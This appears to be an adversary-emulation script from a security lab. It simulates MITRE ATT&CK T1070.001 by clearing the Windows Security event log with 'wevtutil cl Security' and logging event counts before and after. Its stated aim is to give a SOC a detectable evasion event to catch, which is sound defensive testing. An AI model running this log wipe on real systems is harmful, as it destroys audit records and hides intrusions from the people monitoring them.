# =============================================================================
# 04-attacks / t1070-clearlogs.ps1
# T1070.001 - Indicator Removal: Clear Windows Event Logs  (Defense Evasion)
# Clears the Security event log via wevtutil (scripted, not manual), with
# timestamped logging. This is the exact evasion technique a SOC must catch
# (a sudden, scripted clear of Security is high-signal).
#
# Run as Administrator on the Windows VM.
# =============================================================================
#Requires -RunAsAdministrator
$ErrorActionPreference = 'Continue'

$LogFile = "t1070_timeline.log"
function Log($m) {
    $line = "$(Get-Date -Format o) | $m"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line
}

Log "[T1070.001] Indicator Removal: Clear Windows Security log | target=$env:COMPUTERNAME"
Log "[T1070.001] ATT&CK = https://attack.mitre.org/techniques/T1070/001/"

$before = (Get-WinEvent -LogName Security -ErrorAction SilentlyContinue | Measure-Object).Count
Log "[T1070.001] Security log event count BEFORE clear: $before"

Log "[T1070.001] Executing: wevtutil cl Security"
& wevtutil cl Security

Start-Sleep -Seconds 1
$after = (Get-WinEvent -LogName Security -ErrorAction SilentlyContinue | Measure-Object).Count
Log "[T1070.001] Security log event count AFTER clear: $after"
Log "[T1070.001] END | timeline -> $LogFile"
